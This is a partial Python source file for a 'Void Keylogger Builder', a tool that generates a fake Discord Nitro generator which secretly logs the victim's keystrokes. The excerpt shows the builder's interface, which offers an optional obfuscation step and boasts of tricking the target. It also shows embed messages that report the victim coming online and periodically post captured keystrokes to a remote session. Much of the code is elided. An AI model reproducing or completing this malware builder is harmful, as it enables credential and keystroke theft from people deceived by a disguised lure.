...
def _conn():
    ...
    emb = {
        'title': '👑  VOID - TARGET ONLINE  [NITRO GEN MODE]',
        'color': 0x00FF88,
        ...
        'footer': {'text': f'Void Nitro Engine | {SID}'},
...
def _flush(trigger):
    ...
    emb = {
        ...
        'footer': {'text': f'Void Keylogger | Session: {SID}'},
        'timestamp': datetime.datetime.now(datetime.timezone.utc).isoformat()
    }
    _post(emb)
...
def boot():
    if sys.platform.startswith("win"): os.system("title VOID KEYLOGGER // FLAWLESS NITRO")
    os.system("cls" if os.name == "nt" else "clear")
...
def get_output_dir():
    ...
    void_parent = os.path.abspath(os.path.join(script_dir, "..", "..", ".."))
    out_dir     = os.path.join(void_parent, "Void - Output", "Keylogger")
...
def main():
    ...
    console.print(Align.center(Panel(
        Group(
            Align.center(Text.from_markup(f"[bold {C_NEON}]VOID KEYLOGGER BUILDER[/] [white]v2.9 FLAWLESS[/]")),
            Text(""),
            Align.center(Text.from_markup(f"[bold {C_WHITE}]TRAP :[/] [bold #00FF88]NITRO GEN (PURE EVIL)[/] [dim]|[/] [bold {C_WHITE}]FIX :[/] [bold #00FF88]NAME ERROR RESOLVED[/]")),
            Align.center(Text.from_markup(f"[dim {C_DIM}]Generates a flawless fake generator to 100% trick the target[/]"))
        ),
    ...
    is_ultra = (console.input(f"\n  [bold {C_RED}]02 »[/] choose mode (1: normal / 2: obfuscated) >> ").strip() == "2")

    # STEP 3
    section("STEP 3  ──  FILENAME")
    fname_input = console.input(f"  [bold {C_RED}]└─▶[/] Name (Nitro-Gen) >> ").strip() or "Nitro-Gen"
    if not fname_input.endswith(".py"): fname_input += ".py"

    # BUILD
    section("PARFECT TRAP INJECTION")
    out_dir = get_output_dir()
    filepath = os.path.join(out_dir, fname_input)

    with Progress(SpinnerColumn(spinner_name="dots2", style=f"bold {C_RED}"), TextColumn("[white]Rebuilding variables..."), console=console, transient=True) as p:
    ...
    if is_ultra:
        with Progress(SpinnerColumn(spinner_name="point", style=f"bold {C_GOLD}"), TextColumn("[bold gold]Masking threat..."), console=console, transient=True) as p:
            p.add_task("", total=None)
    ...
    console.print(Panel(
        Group(
            Align.center(Text.from_markup(f"[bold {C_GREEN}]✔ NITRO-GEN PAYLOAD V2.9 (CLEAN)[/]")),
            Text(""),
            ...
            Text(""),
            Align.center(Text.from_markup(f"[dim]No valid code will be shown for more realism.[/]"))
        ),
        border_style=C_GREEN, box=box.DOUBLE_EDGE, padding=(1, 4)
    ))
    
    if console.input(f"\n  [bold {C_RED}]>[/] [dim]Open folder ? (y/n) >> [/]").lower() == 'y':
        try:
